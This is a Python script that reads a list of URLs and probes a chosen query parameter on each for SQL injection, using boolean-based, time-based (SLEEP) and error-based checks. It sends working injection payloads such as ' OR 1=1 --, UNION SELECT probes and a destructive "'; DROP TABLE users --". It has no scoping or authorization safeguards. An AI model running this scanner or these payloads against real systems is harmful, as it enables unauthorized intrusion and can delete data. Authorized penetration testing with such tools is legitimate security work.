import requests
from requests.exceptions import RequestException
import time

def test_boolean_blind_sql_injection(url, param_name):
    """
    Tests a given API endpoint for Boolean-based Blind SQL injection vulnerabilities.
    
    :param url: The URL of the API endpoint to test.
    :param param_name: The parameter in the URL to test for injection.
    """
    print(f"\n[+] Testing Boolean-based Blind SQL Injection on: {url}\n")
    
    # Boolean-based payloads
    payload_true = "' OR 1=1 -- "
    payload_false = "' OR 1=2 -- "
    
    try:
        # Send requests with true and false payloads
        params_true = {param_name: payload_true}
        params_false = {param_name: payload_false}
        
        response_true = requests.get(url, params=params_true)
        response_false = requests.get(url, params=params_false)
        
        if response_true.text != response_false.text:
            print(f"[!] Possible Boolean-based Blind SQL Injection vulnerability detected.")
        else:
            print("[-] No Boolean-based vulnerability detected.")
        
    except RequestException as e:
        print(f"[!] Error connecting to the URL: {e}")

def test_time_based_blind_sql_injection(url, param_name):
    """
    Tests a given API endpoint for Time-based Blind SQL injection vulnerabilities.
    
    :param url: The URL of the API endpoint to test.
    :param param_name: The parameter in the URL to test for injection.
    """
    print(f"\n[+] Testing Time-based Blind SQL Injection on: {url}\n")
    
    # Time-based payload (delays response by 5 seconds if true)
    payload = "' OR IF(1=1, SLEEP(5), 0) -- "
    
    try:
        # Send request with time-based payload
        params = {param_name: payload}
        start_time = time.time()  # Record the start time
        response = requests.get(url, params=params)
        
        # Check if response time is significantly longer than normal
        response_time = time.time() - start_time
        if response_time > 4:  # 4 seconds threshold to detect delay
            print(f"[!] Possible Time-based Blind SQL Injection vulnerability detected.")
        else:
            print("[-] No Time-based vulnerability detected.")
        
    except RequestException as e:
        print(f"[!] Error connecting to the URL: {e}")

def test_sql_injection(url, param_name):
    """
    Tests a given API endpoint for SQL injection vulnerabilities, including Boolean and Time-based Blind.
    
    :param url: The URL of the API endpoint to test.
    :param param_name: The parameter in the URL to test for injection.
    """
    print(f"\n[+] Testing SQL Injection on: {url}\n")
    
    # SQL injection payloads
    payloads = [
        "' OR 1=1 -- ",
        "' OR 'a'='a",
        '" OR ""="',
        "' UNION SELECT null, null -- ",
        "' AND 1=2 UNION SELECT null -- ",
        "'; DROP TABLE users --",
    ]
    
    vulnerable = False
    
    for payload in payloads:
        print(f"[*] Testing payload: {payload}")
        params = {param_name: payload}
        
        try:
            # Send the request with the payload
            response = requests.get(url, params=params)
            response_text = response.text.lower()
            
            # Detect if the payload caused an unexpected behavior
            if "sql" in response_text or "syntax" in response_text or "error" in response_text:
                print(f"[!] Possible vulnerability detected with payload: {payload}")
                vulnerable = True
            else:
                print(f"[-] No significant response variation with payload: {payload}")
        
        except RequestException as e:
            print(f"[!] Error connecting to the URL: {e}")
            break

    if not vulnerable:
        print("\n[-] No vulnerabilities detected.")
    else:
        print("\n[!] Potential vulnerabilities detected. Further testing is advised.")
    
    # Test for Boolean and Time-based Blind SQL Injection
    test_boolean_blind_sql_injection(url, param_name)
    test_time_based_blind_sql_injection(url, param_name)

def test_multiple_urls(file_path, param_name):
    """
    Reads URLs from a file and tests each for SQL injection vulnerabilities, including Blind SQL injection.
    
    :param file_path: Path to the file containing URLs.
    :param param_name: The parameter in the URLs to test for injection.
    """
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
        
        if not urls:
            print("[!] No URLs found in the file.")
            return
        
        print(f"\n[+] Found {len(urls)} URLs to test.")
        for url in urls:
            test_sql_injection(url, param_name)
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")

if __name__ == "__main__":
    # Input the file path and parameter to test
    input_file = input("Enter the path to the file containing URLs: ").strip()
    parameter_name = input("Enter the parameter to test (e.g., id, username): ").strip()
    
    if input_file and parameter_name:
        test_multiple_urls(input_file, parameter_name)
    else:
        print("[!] File path and parameter name are required.")
